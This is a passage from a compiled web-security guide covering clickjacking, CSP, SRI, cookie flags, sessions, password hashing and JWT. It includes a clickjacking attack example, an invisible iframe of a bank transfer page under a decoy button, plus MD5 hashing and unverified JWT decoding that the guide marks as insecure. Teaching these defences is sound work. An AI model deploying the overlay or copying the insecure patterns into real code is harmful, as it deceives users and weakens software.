",(0,r.jsx)(n.strong,{children:"Avoid:"})," CORS misconfiguration that allows credential sharing"]}),"\n",(0,r.jsx)(n.h3,{id:"clickjacking-1",children:"Clickjacking"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nTricking users into clicking on something different from what they perceive."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Attack Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'\x3c!-- Attacker\'s website --\x3e\n<iframe\n  src="https://bank.com/transfer"\n  style="opacity: 0; position: absolute; top: 0; left: 0;">\n</iframe>\n\n<button style="position: absolute; top: 100px; left: 100px;">\n  Click for free prize!\n</button>\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. X-Frame-Options Header:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"X-Frame-Options: DENY\n# or\nX-Frame-Options: SAMEORIGIN\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Express\napp.use((req, res, next) => {\n  res.setHeader('X-Frame-Options', 'DENY');\n  next();\n});\n\n// Helmet.js\nconst helmet = require('helmet');\napp.use(helmet.frameguard({ action: 'deny' }));\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Content-Security-Policy:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy: frame-ancestors 'none';\n# or\nContent-Security-Policy: frame-ancestors 'self' https://trusted.com;\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. JavaScript Frame-Busting (Legacy):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Not recommended as primary defense\nif (top !== self) {\n  top.location = self.location;\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," CSP frame-ancestors (modern approach)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," X-Frame-Options as fallback\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Both headers for maximum compatibility\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Relying only on JavaScript frame-busting\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Allowing your site to be framed unnecessarily"]}),"\n",(0,r.jsx)(n.h3,{id:"content-security-policy-csp-1",children:"Content Security Policy (CSP)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nHTTP header that controls resources the browser is allowed to load."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Basic CSP:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy: default-src 'self'\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Comprehensive CSP Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-{random}' https://trusted-cdn.com;\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' data: https://images.example.com;\n  font-src 'self' https://fonts.gstatic.com;\n  connect-src 'self' https://api.example.com;\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n  upgrade-insecure-requests;\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Directive Breakdown:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Express implementation\napp.use((req, res, next) => {\n  const nonce = generateNonce();\n  res.locals.nonce = nonce;\n\n  res.setHeader('Content-Security-Policy', `\n    default-src 'self';\n    script-src 'self' 'nonce-${nonce}';\n    style-src 'self' 'unsafe-inline';\n    img-src 'self' https: data:;\n    font-src 'self' https://fonts.gstatic.com;\n    connect-src 'self' https://api.example.com;\n    object-src 'none';\n    base-uri 'self';\n    form-action 'self';\n    frame-ancestors 'none';\n    upgrade-insecure-requests;\n  `.replace(/\\s+/g, ' ').trim());\n\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Using Nonces:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:"\x3c!-- Server-side template --\x3e\n<script nonce=\"{{nonce}}\">\n  // This will execute\n  console.log('Allowed script');\n<\/script>\n\n<script>\n  // This will be blocked (no nonce)\n  console.log('Blocked script');\n<\/script>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"CSP Reporting:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy-Report-Only:\n  default-src 'self';\n  report-uri /csp-violation-report;\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Collect CSP violations\napp.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {\n  console.log('CSP Violation:', req.body);\n  // Log to monitoring service\n  res.status(204).end();\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Start with Report-Only mode\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Nonces for inline scripts\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," 'strict-dynamic' for modern browsers\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," upgrade-insecure-requests\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," 'unsafe-inline' and 'unsafe-eval'\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Overly permissive policies\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Wildcard sources (*)"]}),"\n",(0,r.jsx)(n.h3,{id:"subresource-integrity-sri-1",children:"Subresource Integrity (SRI)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nEnsures that files fetched from CDNs haven't been tampered with."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'\x3c!-- With SRI --\x3e\n<script\n  src="https://cdn.example.com/library.js"\n  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"\n  crossorigin="anonymous">\n<\/script>\n\n<link\n  rel="stylesheet"\n  href="https://cdn.example.com/style.css"\n  integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"\n  crossorigin="anonymous">\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Generating SRI Hashes:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Using openssl\ncurl -s https://cdn.example.com/library.js | openssl dgst -sha384 -binary | openssl base64 -A\n\n# Using Node.js\nconst crypto = require('crypto');\nconst fs = require('fs');\n\nconst file = fs.readFileSync('library.js');\nconst hash = crypto.createHash('sha384').update(file).digest('base64');\nconsole.log(`sha384-${hash}`);\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," SRI for all third-party scripts and styles\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," SHA-384 or SHA-512 algorithms\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," crossorigin attribute with SRI\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Multiple hashes for fallback\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Using SRI without crossorigin\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Weak hash algorithms (MD5, SHA-1)"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"4-cookie-security-1",children:"4. Cookie Security"}),"\n",(0,r.jsx)(n.h3,{id:"cookie-flags-explained-1",children:"Cookie Flags Explained"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Complete Cookie Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"Set-Cookie: sessionId=abc123;\n  Secure;\n  HttpOnly;\n  SameSite=Strict;\n  Domain=example.com;\n  Path=/;\n  Max-Age=3600;\n  Expires=Wed, 21 Oct 2025 07:28:00 GMT\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Flag Breakdown:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Secure"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 HTTPS only - prevents MITM attacks\nres.cookie('token', value, { secure: true });\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Cookie sent only over HTTPS"}),"\n",(0,r.jsx)(n.li,{children:"Prevents interception on unsecured connections"}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Always use in production"})}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. HttpOnly"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u2705 No JavaScript access - prevents XSS cookie theft\nres.cookie('sessionId', value, { httpOnly: true });\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Cannot be accessed via ",(0,r.jsx)(n.code,{children:"document.cookie"})]}),"\n",(0,r.jsx)(n.li,{children:"Protects against XSS attacks"}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Use for authentication tokens"})}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. SameSite"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Strict - Maximum CSRF protection\nres.cookie('auth', value, { sameSite: 'strict' });\n\n// Lax - Balance of security and usability (default)\nres.cookie('session', value, { sameSite: 'lax' });\n\n// None - Required for cross-site cookies (needs Secure)\nres.cookie('tracking', value, { sameSite: 'none', secure: true });\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"SameSite Comparison:"})}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"SameSite Value"}),(0,r.jsx)(n.th,{children:"Cross-site GET"}),(0,r.jsx)(n.th,{children:"Cross-site POST"}),(0,r.jsx)(n.th,{children:"Use Case"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Strict"}),(0,r.jsx)(n.td,{children:"\u274c"}),(0,r.jsx)(n.td,{children:"\u274c"}),(0,r.jsx)(n.td,{children:"Auth cookies"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Lax (default)"}),(0,r.jsx)(n.td,{children:"\u2705 (top-level)"}),(0,r.jsx)(n.td,{children:"\u274c"}),(0,r.jsx)(n.td,{children:"Session cookies"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"None"}),(0,r.jsx)(n.td,{children:"\u2705"}),(0,r.jsx)(n.td,{children:"\u2705"}),(0,r.jsx)(n.td,{children:"Third-party cookies"})]})]})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Domain & Path"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Scope cookie to specific domain/subdomain\nres.cookie('data', value, {\n  domain: '.example.com', // Available to all subdomains\n  path: '/api' // Only sent to /api routes\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"5. Max-Age & Expires"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Session cookie (deleted when browser closes)\nres.cookie('session', value);\n\n// Persistent cookie with Max-Age (in seconds)\nres.cookie('remember', value, { maxAge: 30 * 24 * 60 * 60 * 1000 }); // 30 days\n\n// Persistent cookie with Expires\nconst expiryDate = new Date(Date.now() + 60 * 60 * 1000); // 1 hour\nres.cookie('temp', value, { expires: expiryDate });\n"})}),"\n",(0,r.jsx)(n.h3,{id:"cookie-best-practices-1",children:"Cookie Best Practices"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Authentication Cookie (Most Secure):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"res.cookie('sessionId', sessionId, {\n  httpOnly: true,      // Prevent XSS access\n  secure: true,        // HTTPS only\n  sameSite: 'strict',  // Strong CSRF protection\n  maxAge: 3600000,     // 1 hour\n  signed: true         // Cryptographic signature\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Session Cookie Configuration:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const session = require('express-session');\n\napp.use(session({\n  secret: process.env.SESSION_SECRET,\n  name: 'sid', // Don't use default name\n  resave: false,\n  saveUninitialized: false,\n  cookie: {\n    httpOnly: true,\n    secure: process.env.NODE_ENV === 'production',\n    sameSite: 'strict',\n    maxAge: 1000 * 60 * 60 * 24 // 24 hours\n  },\n  store: new RedisStore({ client: redisClient }) // Use persistent store\n}));\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Cookie Prefixes:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// __Secure- prefix: Must be set with Secure flag\nres.cookie('__Secure-sessionId', value, {\n  secure: true,\n  httpOnly: true,\n  sameSite: 'strict'\n});\n\n// __Host- prefix: More restrictive\nres.cookie('__Host-sessionId', value, {\n  secure: true,\n  httpOnly: true,\n  sameSite: 'strict',\n  path: '/',\n  domain: undefined // Cannot set domain\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"session-management-1",children:"Session Management"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Best Practices:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Secure Session Generation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const crypto = require('crypto');\n\nfunction generateSessionId() {\n  return crypto.randomBytes(32).toString('hex');\n}\n\n// Store in secure backend (Redis recommended)\nasync function createSession(userId) {\n  const sessionId = generateSessionId();\n  const sessionData = {\n    userId,\n    createdAt: Date.now(),\n    expiresAt: Date.now() + 3600000, // 1 hour\n    ipAddress: req.ip,\n    userAgent: req.headers['user-agent']\n  };\n\n  await redisClient.setex(\n    `session:${sessionId}`,\n    3600, // TTL in seconds\n    JSON.stringify(sessionData)\n  );\n\n  return sessionId;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Session Validation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"async function validateSession(sessionId) {\n  const sessionData = await redisClient.get(`session:${sessionId}`);\n\n  if (!sessionData) {\n    return null; // Session expired or invalid\n  }\n\n  const session = JSON.parse(sessionData);\n\n  // Check expiration\n  if (Date.now() > session.expiresAt) {\n    await redisClient.del(`session:${sessionId}`);\n    return null;\n  }\n\n  // Additional checks\n  if (session.ipAddress !== req.ip) {\n    // Log suspicious activity\n    logger.warn('IP mismatch for session', { sessionId, userId: session.userId });\n    // Optional: invalidate session\n  }\n\n  return session;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Session Rotation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Rotate session ID after privilege escalation\nasync function rotateSession(oldSessionId) {\n  const oldSession = await redisClient.get(`session:${oldSessionId}`);\n\n  if (!oldSession) return null;\n\n  const newSessionId = generateSessionId();\n\n  // Copy session data to new ID\n  await redisClient.setex(\n    `session:${newSessionId}`,\n    3600,\n    oldSession\n  );\n\n  // Delete old session\n  await redisClient.del(`session:${oldSessionId}`);\n\n  return newSessionId;\n}\n\n// Use after login, password change, privilege escalation\napp.post('/login', async (req, res) => {\n  const user = await authenticateUser(req.body);\n\n  if (user) {\n    const sessionId = await createSession(user.id);\n\n    res.cookie('sessionId', sessionId, {\n      httpOnly: true,\n      secure: true,\n      sameSite: 'strict',\n      maxAge: 3600000\n    });\n\n    res.json({ success: true });\n  }\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Logout & Session Termination:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"app.post('/logout', async (req, res) => {\n  const sessionId = req.cookies.sessionId;\n\n  if (sessionId) {\n    await redisClient.del(`session:${sessionId}`);\n  }\n\n  res.clearCookie('sessionId', {\n    httpOnly: true,\n    secure: true,\n    sameSite: 'strict'\n  });\n\n  res.json({ success: true });\n});\n\n// Logout all devices\napp.post('/logout-all', async (req, res) => {\n  const userId = req.user.id;\n\n  // Find all sessions for user\n  const keys = await redisClient.keys(`session:*`);\n\n  for (const key of keys) {\n    const session = await redisClient.get(key);\n    if (JSON.parse(session).userId === userId) {\n      await redisClient.del(key);\n    }\n  }\n\n  res.json({ success: true });\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Server-side session storage (Redis, database)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Secure session ID generation (crypto.randomBytes)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Session expiration and rotation\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," IP and User-Agent validation\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Client-side session storage\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Predictable session IDs\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Long-lived sessions without renewal\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Session fixation vulnerabilities"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"5-authentication--authorization-1",children:"5. Authentication & Authorization"}),"\n",(0,r.jsx)(n.h3,{id:"authentication-methods-1",children:"Authentication Methods"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Comparison Table:"})}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Method"}),(0,r.jsx)(n.th,{children:"Best For"}),(0,r.jsx)(n.th,{children:"Pros"}),(0,r.jsx)(n.th,{children:"Cons"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Session + Cookie"}),(0,r.jsx)(n.td,{children:"Traditional web apps"}),(0,r.jsx)(n.td,{children:"Server control, easy revocation"}),(0,r.jsx)(n.td,{children:"Scalability, CSRF risk"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"JWT"}),(0,r.jsx)(n.td,{children:"APIs, SPAs"}),(0,r.jsx)(n.td,{children:"Stateless, portable"}),(0,r.jsx)(n.td,{children:"Cannot revoke easily, larger size"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"OAuth 2.0"}),(0,r.jsx)(n.td,{children:"Third-party auth"}),(0,r.jsx)(n.td,{children:"Delegated auth, SSO"}),(0,r.jsx)(n.td,{children:"Complex, token management"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"WebAuthn"}),(0,r.jsx)(n.td,{children:"High security"}),(0,r.jsx)(n.td,{children:"Phishing-resistant, no passwords"}),(0,r.jsx)(n.td,{children:"Browser support, UX learning curve"})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"password-security-1",children:"Password Security"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Storage Best Practices:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const bcrypt = require('bcrypt');\nconst argon2 = require('argon2');\n\n// \u2705 SECURE - Bcrypt (industry standard)\nasync function hashPassword(password) {\n  const saltRounds = 12; // Higher = more secure but slower\n  return await bcrypt.hash(password, saltRounds);\n}\n\nasync function verifyPassword(password, hash) {\n  return await bcrypt.compare(password, hash);\n}\n\n// \u2705 EVEN BETTER - Argon2 (most modern)\nasync function hashPasswordArgon2(password) {\n  return await argon2.hash(password, {\n    type: argon2.argon2id,\n    memoryCost: 2 ** 16, // 64 MB\n    timeCost: 3,\n    parallelism: 1\n  });\n}\n\nasync function verifyPasswordArgon2(password, hash) {\n  return await argon2.verify(hash, password);\n}\n\n// \u274c INSECURE - Never do this\nfunction badHash(password) {\n  return crypto.createHash('md5').update(password).digest('hex');\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Password Policy Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const passwordValidator = require('password-validator');\n\nconst schema = new passwordValidator();\n\nschema\n  .is().min(12)                          // Minimum length 12\n  .is().max(128)                         // Maximum length 128\n  .has().uppercase()                     // Must have uppercase letters\n  .has().lowercase()                     // Must have lowercase letters\n  .has().digits(1)                       // Must have at least 1 digit\n  .has().symbols(1)                      // Must have at least 1 symbol\n  .has().not().spaces()                  // Should not have spaces\n  .is().not().oneOf(['Password123!', 'Admin123!']); // Blacklist common passwords\n\nfunction validatePassword(password) {\n  const errors = schema.validate(password, { list: true });\n\n  if (errors.length > 0) {\n    throw new Error(`Password validation failed: ${errors.join(', ')}`);\n  }\n\n  return true;\n}\n\n// Check against leaked password database\nconst hibp = require('hibp');\n\nasync function checkPasswordBreach(password) {\n  const breachCount = await hibp.pwnedPassword(password);\n\n  if (breachCount > 0) {\n    throw new Error(`This password has been exposed in ${breachCount} data breaches`);\n  }\n\n  return true;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Account Security Measures:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Rate limiting login attempts\nconst rateLimit = require('express-rate-limit');\n\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 5, // 5 attempts\n  message: 'Too many login attempts, please try again later',\n  standardHeaders: true,\n  legacyHeaders: false,\n  skipSuccessfulRequests: true\n});\n\napp.post('/login', loginLimiter, async (req, res) => {\n  // Login logic\n});\n\n// Account lockout after failed attempts\nasync function handleFailedLogin(userId) {\n  const key = `failed_attempts:${userId}`;\n  const attempts = await redisClient.incr(key);\n\n  if (attempts === 1) {\n    await redisClient.expire(key, 900); // 15 minutes\n  }\n\n  if (attempts >= 5) {\n    await lockAccount(userId, 1800); // Lock for 30 minutes\n    await notifyUser(userId, 'Account locked due to failed login attempts');\n  }\n\n  return attempts;\n}\n\nasync function lockAccount(userId, duration) {\n  await redisClient.setex(`account_locked:${userId}`, duration, '1');\n}\n\nasync function isAccountLocked(userId) {\n  return await redisClient.exists(`account_locked:${userId}`);\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"json-web-tokens-jwt-1",children:"JSON Web Tokens (JWT)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Structure:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"Header.Payload.Signature\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const jwt = require('jsonwebtoken');\n\n// Generate tokens\nfunction generateTokens(user) {\n  const accessToken = jwt.sign(\n    {\n      userId: user.id,\n      email: user.email,\n      role: user.role\n    },\n    process.env.ACCESS_TOKEN_SECRET,\n    {\n      expiresIn: '15m',\n      issuer: 'api.example.com',\n      audience: 'example.com'\n    }\n  );\n\n  const refreshToken = jwt.sign(\n    {\n      userId: user.id,\n      tokenVersion: user.tokenVersion // For token revocation\n    },\n    process.env.REFRESH_TOKEN_SECRET,\n    {\n      expiresIn: '7d',\n      issuer: 'api.example.com',\n      audience: 'example.com'\n    }\n  );\n\n  return { accessToken, refreshToken };\n}\n\n// Verify JWT middleware\nfunction authenticateToken(req, res, next) {\n  const authHeader = req.headers['authorization'];\n  const token = authHeader && authHeader.split(' ')[1];\n\n  if (!token) {\n    return res.status(401).json({ error: 'No token provided' });\n  }\n\n  try {\n    const decoded = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, {\n      issuer: 'api.example.com',\n      audience: 'example.com'\n    });\n\n    req.user = decoded;\n    next();\n  } catch (err) {\n    if (err.name === 'TokenExpiredError') {\n      return res.status(401).json({ error: 'Token expired' });\n    }\n    return res.status(403).json({ error: 'Invalid token' });\n  }\n}\n\n// Refresh token endpoint\napp.post('/refresh', async (req, res) => {\n  const { refreshToken } = req.body;\n\n  if (!refreshToken) {\n    return res.status(401).json({ error: 'Refresh token required' });\n  }\n\n  try {\n    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);\n\n    // Check if user exists and token version matches\n    const user = await getUserById(decoded.userId);\n\n    if (!user || user.tokenVersion !== decoded.tokenVersion) {\n      return res.status(403).json({ error: 'Invalid refresh token' });\n    }\n\n    // Generate new access token\n    const accessToken = jwt.sign(\n      { userId: user.id, email: user.email, role: user.role },\n      process.env.ACCESS_TOKEN_SECRET,\n      { expiresIn: '15m' }\n    );\n\n    res.json({ accessToken });\n  } catch (err) {\n    return res.status(403).json({ error: 'Invalid refresh token' });\n  }\n});\n\n// Token revocation (by incrementing tokenVersion)\nasync function revokeAllTokens(userId) {\n  await db.query(\n    'UPDATE users SET token_version = token_version + 1 WHERE id = ?',\n    [userId]\n  );\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"JWT Storage Options:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. HttpOnly Cookie (Most Secure for Web):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Set JWT in HttpOnly cookie\nres.cookie('accessToken', accessToken, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  maxAge: 15 * 60 * 1000 // 15 minutes\n});\n\n// Frontend automatically sends cookie\nfetch('/api/protected', {\n  credentials: 'include'\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Authorization Header (Standard for APIs):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Frontend stores in memory (React example)\nconst [token, setToken] = useState(null);\n\n// Send with requests\nfetch('/api/protected', {\n  headers: {\n    'Authorization': `Bearer ${token}`\n  }\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"JWT Security Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Short-lived access tokens (15 minutes)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Refresh token rotation\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Strong secret keys (256-bit minimum)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Algorithm verification (RS256 for production)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Token version for revocation\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Storing sensitive data in payload\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Long-lived tokens without refresh\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," localStorage for tokens (XSS risk)\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Using 'none' algorithm"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common JWT Mistakes:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c DANGEROUS - No signature verification\nconst decoded = jwt.decode(token); // Never use decode without verify!\n\n// \u274c DANGEROUS - 